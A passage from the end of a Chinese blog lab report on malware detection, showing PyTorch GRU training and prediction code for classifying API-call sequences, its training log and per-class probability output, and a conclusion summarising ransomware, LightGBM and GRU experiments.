sequences.to(DEVICE), labels.to(DEVICE)</span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">            outputs = model(sequences)</span><br><span class="line">            loss = criterion(outputs, labels)</span><br><span class="line">            loss.backward()</span><br><span class="line">            optimizer.step()</span><br><span class="line">            epoch_loss += loss.item() * sequences.size(0)</span><br><span class="line">            preds = outputs.argmax(dim=1)</span><br><span class="line">            correct += (preds == labels).sum().item()</span><br><span class="line">            total += labels.size(0)</span><br><span class="line">        return epoch_loss / total, correct / total</span><br><span class="line"></span><br><span class="line">    def validate_epoch(model, dataloader, criterion):</span><br><span class="line">        model.eval()</span><br><span class="line">        epoch_loss, correct, total = 0, 0, 0</span><br><span class="line">        with torch.no_grad():</span><br><span class="line">            for sequences, labels in tqdm(dataloader, desc=&quot;Validation&quot;):</span><br><span class="line">                sequences, labels = sequences.to(DEVICE), labels.to(DEVICE)</span><br><span class="line">                outputs = model(sequences)</span><br><span class="line">                loss = criterion(outputs, labels)</span><br><span class="line">                epoch_loss += loss.item() * sequences.size(0)</span><br><span class="line">                preds = outputs.argmax(dim=1)</span><br><span class="line">                correct += (preds == labels).sum().item()</span><br><span class="line">                total += labels.size(0)</span><br><span class="line">        return epoch_loss / total, correct / total</span><br><span class="line"></span><br><span class="line">    # 开始训练模型</span><br><span class="line">    best_val_loss = float(&#x27;inf&#x27;)</span><br><span class="line">    for epoch in range(EPOCHS):</span><br><span class="line">        print(f&quot;\nEpoch &#123;epoch + 1&#125;/&#123;EPOCHS&#125;&quot;)</span><br><span class="line">        train_loss, train_acc = train_epoch(model, train_loader, criterion, optimizer)</span><br><span class="line">        val_loss, val_acc = validate_epoch(model, val_loader, criterion)</span><br><span class="line">        print(f&quot;Train Loss: &#123;train_loss:.4f&#125;, Train Accuracy: &#123;train_acc:.4f&#125;&quot;)</span><br><span class="line">        print(f&quot;Validation Loss: &#123;val_loss:.4f&#125;, Validation Accuracy: &#123;val_acc:.4f&#125;&quot;)</span><br><span class="line">        if val_loss &lt; best_val_loss:</span><br><span class="line">            best_val_loss = val_loss</span><br><span class="line">            torch.save(model.state_dict(), MODEL_PATH)</span><br><span class="line">            print(f&quot;Model saved at &#123;MODEL_PATH&#125;!&quot;)</span><br><span class="line"></span><br><span class="line"># 测试集预测</span><br><span class="line">model.eval()</span><br><span class="line">test_preds = []</span><br><span class="line">with torch.no_grad():</span><br><span class="line">    for sequences in tqdm(test_loader, desc=&quot;Testing&quot;):</span><br><span class="line">        sequences = sequences.to(DEVICE)</span><br><span class="line">        outputs = model(sequences)</span><br><span class="line">        preds = torch.softmax(outputs, dim=1).cpu().numpy()</span><br><span class="line">        test_preds.append(preds)</span><br><span class="line"></span><br><span class="line">test_preds = np.concatenate(test_preds, axis=0)</span><br><span class="line"></span><br><span class="line"># 创建提交文件</span><br><span class="line">sub = pd.DataFrame()</span><br><span class="line">sub[&#x27;file_id&#x27;] = te[&#x27;file_id&#x27;]  # 使用测试集中的 file_id 列</span><br><span class="line"></span><br><span class="line"># 将每个类别的预测概率填入</span><br><span class="line">for i in range(NUM_CLASSES):</span><br><span class="line">    sub[f&#x27;prob&#123;i&#125;&#x27;] = test_preds[:, i]</span><br><span class="line"></span><br><span class="line"># 保存为提交文件</span><br><span class="line">sub.to_csv(&#x27;pytorch_gru_submission.csv&#x27;, index=False)</span><br><span class="line">print(&quot;预测完成并保存至 pytorch_gru_submission.csv&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">PS D:\chen_hao\病毒检测机器学习&gt; &amp; D:/ProgramSoftware/anaconda3/python.exe d:/chen_hao/病毒检测机器学习/RNN.py</span><br><span class="line">Using device: cuda</span><br><span class="line"></span><br><span class="line">Epoch 1/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:32&lt;00:00,  1.35it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.01it/s] </span><br><span class="line">Train Loss: 1.6978, Train Accuracy: 0.4272</span><br><span class="line">Validation Loss: 1.5224, Validation Accuracy: 0.4460</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 2/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:27&lt;00:00,  1.59it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.01it/s] </span><br><span class="line">Train Loss: 1.5041, Train Accuracy: 0.4547</span><br><span class="line">Validation Loss: 1.5046, Validation Accuracy: 0.4471</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 3/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:29&lt;00:00,  1.51it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s] </span><br><span class="line">Train Loss: 1.4797, Train Accuracy: 0.4620</span><br><span class="line">Validation Loss: 1.4927, Validation Accuracy: 0.4489</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 4/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.56it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s] </span><br><span class="line">Train Loss: 1.4648, Train Accuracy: 0.4689</span><br><span class="line">Validation Loss: 1.4740, Validation Accuracy: 0.4633</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 5/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:27&lt;00:00,  1.58it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s] </span><br><span class="line">Train Loss: 1.4373, Train Accuracy: 0.4820</span><br><span class="line">Validation Loss: 1.4314, Validation Accuracy: 0.4924</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 6/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:27&lt;00:00,  1.59it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.01it/s] </span><br><span class="line">Train Loss: 1.4187, Train Accuracy: 0.4918</span><br><span class="line">Validation Loss: 1.3496, Validation Accuracy: 0.5169</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 7/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.57it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s] </span><br><span class="line">Train Loss: 1.4115, Train Accuracy: 0.5090</span><br><span class="line">Validation Loss: 1.3058, Validation Accuracy: 0.5504</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 8/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.57it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.00it/s] </span><br><span class="line">Train Loss: 1.1772, Train Accuracy: 0.6115</span><br><span class="line">Validation Loss: 1.0737, Validation Accuracy: 0.6267</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 9/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s] </span><br><span class="line">Train Loss: 1.0006, Train Accuracy: 0.6609</span><br><span class="line">Validation Loss: 0.9820, Validation Accuracy: 0.6598</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 10/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s] </span><br><span class="line">Train Loss: 0.9129, Train Accuracy: 0.6887</span><br><span class="line">Validation Loss: 0.9084, Validation Accuracy: 0.6749</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 11/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s] </span><br><span class="line">Train Loss: 0.8453, Train Accuracy: 0.7069</span><br><span class="line">Validation Loss: 0.8542, Validation Accuracy: 0.7030</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 12/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s] </span><br><span class="line">Train Loss: 0.7822, Train Accuracy: 0.7422</span><br><span class="line">Validation Loss: 0.7674, Validation Accuracy: 0.7520</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 13/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s] </span><br><span class="line">Train Loss: 0.7204, Train Accuracy: 0.7704</span><br><span class="line">Validation Loss: 0.7360, Validation Accuracy: 0.7639</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 14/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s] </span><br><span class="line">Train Loss: 0.7144, Train Accuracy: 0.7717</span><br><span class="line">Validation Loss: 0.7184, Validation Accuracy: 0.7664</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 15/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.02it/s] </span><br><span class="line">Train Loss: 0.6625, Train Accuracy: 0.7878</span><br><span class="line">Validation Loss: 0.6925, Validation Accuracy: 0.7721</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 16/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.54it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s] </span><br><span class="line">Train Loss: 0.6390, Train Accuracy: 0.7931</span><br><span class="line">Validation Loss: 0.6748, Validation Accuracy: 0.7815</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 17/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s] </span><br><span class="line">Train Loss: 0.6061, Train Accuracy: 0.8033</span><br><span class="line">Validation Loss: 0.6415, Validation Accuracy: 0.7927</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 18/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.55it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.00it/s] </span><br><span class="line">Train Loss: 0.5665, Train Accuracy: 0.8278</span><br><span class="line">Validation Loss: 0.5947, Validation Accuracy: 0.8279</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 19/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.53it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.02it/s] </span><br><span class="line">Train Loss: 0.5263, Train Accuracy: 0.8396</span><br><span class="line">Validation Loss: 0.5656, Validation Accuracy: 0.8287</span><br><span class="line">Model saved!</span><br><span class="line"></span><br><span class="line">Epoch 20/20</span><br><span class="line">Training: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 44/44 [00:28&lt;00:00,  1.52it/s] </span><br><span class="line">Validation: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 11/11 [00:05&lt;00:00,  2.03it/s] </span><br><span class="line">Train Loss: 0.5044, Train Accuracy: 0.8467</span><br><span class="line">Validation Loss: 0.5578, Validation Accuracy: 0.8366</span><br><span class="line">Model saved!</span><br><span class="line">d:\chen_hao\病毒检测机器学习\RNN.py:146: FutureWarning: You are using `torch.load` with `weights_only=False` (the current default value), which uses the default pickle module implicitly. It is possible to construct malicious pickle data which will execute arbitrary code during unpickling (See https://github.com/pytorch/pytorch/blob/main/SECURITY.md#untrusted-models for more details). In a future release, the default value for `weights_only` will be flipped to `True`. This limits the functions that could be executed during unpickling. Arbitrary objects will no longer be allowed to be loaded via this mode unless they are explicitly allowlisted by the user via `torch.serialization.add_safe_globals`. We recommend you start setting `weights_only=True` for any use case where you don&#x27;t have full control of the loaded file. Please open an issue on GitHub for any issues related to this experimental feature.</span><br><span class="line">  model.load_state_dict(torch.load(&#x27;best_gru_model.pth&#x27;))</span><br><span class="line">Testing: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 51/51 [00:25&lt;00:00,  2.01it/s] </span><br><span class="line">预测完成并保存至 pytorch_gru_submission.csv</span><br><span class="line">PS D:\chen_hao\病毒检测机器学习&gt;</span><br></pre></td></tr></table></figure>
   <img src="/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/image-20241212143434312.png" class="" title="image-20241212123845251">
   <img src="/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/image-20241212144205267.png" class="" title="image-20241212144205267">
   <img src="/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/image-20241213005217419.png" class="" title="image-20241213005217419">
   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">file_id,prob0,prob1,prob2,prob3,prob4,prob5,prob6,prob7</span><br><span class="line">1,0.06448878,0.002397979,0.9028775,0.0013381493,0.00045697886,0.0020659335,0.003058874,0.023315739</span><br><span class="line">2,0.9813138,8.656157e-05,0.0029583538,0.0011351788,0.00028997194,0.006586187,0.0018473516,0.005782577</span><br><span class="line">3,0.99163276,5.5359196e-05,0.0027402057,0.0004632939,0.000118531985,0.0013870831,0.00072588393,0.0028768326</span><br><span class="line">4,0.021272896,0.011765718,0.024904,0.076123476,0.015064285,0.025066515,0.17768894,0.6481142</span><br><span class="line">5,0.904939,0.00073774875,0.04147379,0.002916103,0.0005452043,0.0022994527,0.007011477,0.040077265</span><br><span class="line">6,0.0021798164,0.0007873667,0.0014384006,0.0027823928,0.00244751,0.9728891,0.011387657,0.006087801</span><br><span class="line">7,0.0068255765,0.017928587,0.0011721165,0.5918627,0.028887965,0.08608816,0.065764345,0.20147054</span><br><span class="line">8,0.256366,0.00392755,0.17083807,0.03653748,0.0030841657,0.014288423,0.043775067,0.4711833</span><br><span class="line">9,0.036793254,0.010180762,0.07269347,0.028041216,0.007907337,0.014224959,0.1945642,0.6355948</span><br><span class="line">10,0.25146127,0.0009808545,0.0032455756,0.375254,0.008948095,0.1938656,0.042228147,0.124016486</span><br><span class="line">11,0.00095530774,0.09089262,0.001956982,0.0021283366,0.0098222485,0.88708365,0.004995707,0.0021652123</span><br><span class="line">12,0.9000948,0.00055806845,0.07364376,0.0017178208,0.00039910257,0.0030469508,0.0031312718,0.017408215</span><br><span class="line">13,0.9858329,7.062489e-05,0.002319975,0.00074456446,0.00021577052,0.0051714894,0.0013318722,0.0043128696</span><br><span class="line">14,0.71485704,0.0018635483,0.1835684,0.0046869554,0.00093834405,0.0039504743,0.012158039,0.07797725</span><br><span class="line">15,0.95209205,0.00034266696,0.024804827,0.0013410876,0.00033840715,0.002777113,0.0031649894,0.015138777</span><br><span class="line">16,0.9988642,6.826462e-05,0.0005704778,5.0490657e-05,5.821846e-05,1.5237126e-05,5.5164932e-05,0.00031797035</span><br><span class="line">17,0.00090827956,0.0009387416,0.0012451294,0.00543124,0.003330927,0.96512026,0.014691722,0.008333769</span><br><span class="line">18,0.01809039,0.0010136849,0.0009486259,0.55183834,0.017171165,0.17679921,0.012343813,0.22179477</span><br><span class="line">19,0.9777029,0.00014269094,0.0092709325,0.0011368245,0.000268385,0.003403238,0.0015272632,0.006547669</span><br><span class="line">20,0.9926167,4.7670434e-05,0.002156556,0.00042129072,0.000109387,0.0013140069,0.0006860488,0.0026483978</span><br><span class="line">21,0.9420716,0.00025259246,0.010330827,0.0035953792,0.0003313114,0.013363041,0.002719807,0.027335435</span><br><span class="line">22,0.010564044,0.013456773,0.013810868,0.10937901,0.023766087,0.07066154,0.2242378,0.53412384</span><br><span class="line">23,0.0074043795,0.0237848,0.8829586,0.016059525,0.012664877,0.015524606,0.0027832955,0.03881999</span><br><span class="line">24,0.7460677,0.0016432973,0.16402717,0.0043358603,0.0008404788,0.003432122,0.010673889,0.06897949</span><br></pre></td></tr></table></figure>
<h4 id="总结与展望"><a href="#总结与展望" class="headerlink" title="总结与展望"></a>总结与展望</h4><ol>
<li><strong>实验结论</strong>：<ul>
<li><strong>勒索病毒</strong>：设计了一个简单的勒索病毒Demo，揭示其文件加密与解密原理。</li>
<li><strong>机器学习</strong>：使用LightGBM结合TF-IDF特征，模型性能优秀，适合快速检测。</li>
<li><strong>深度学习</strong>：GRU模型对复杂API序列分类效果更优，适合进一步研究。</li>
</ul>
</li>
<li><strong>优化方向</strong>：<ul>
<li>引入更复杂的注意力机制，加强深度学习模型对序列数据的理解。</li>
<li>数据增强，扩展训练数据多样性，提升模型泛化能力。</li>
<li>结合机器学习和深度学习结果进行模型融合，进一步提升检测与分类性能。</li>
</ul>
</li>
</ol>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>请我一杯咖啡吧！</div>
  <button>
    赞赏
  </button>
  <div class="post-reward">
      <div>
        <img src="https://raw.githubusercontent.com/moyuan10086/photo/main/alipay.jpg" alt="moyuan 支付宝">
        <span>支付宝</span>
      </div>

  </div>
</div>

          <div class="followme">
  <span>欢迎关注我的其它发布渠道</span>

  <div class="social-list">

      <div class="social-item">
          <span class="social-link">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </span>

          <img class="social-item-img" src="https://raw.githubusercontent.com/moyuan10086/photo/main/Wechat.jpg">
      </div>
  </div>
</div>


        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2024/12/04/CSRF%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E6%8A%A4/" rel="prev" title="CSRF攻击与防护">
                  <i class="fa fa-angle-left"></i> CSRF攻击与防护
                </a>
            </div>
            <div class="post-nav-item">
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2023 – 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">我是 墨鸢（作为一名网络安全工程师来说要有一个虚拟名字，来保护自己的隐私性(～￣▽￣)～）</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  






  




  

  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"all","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>



</body>
</html>
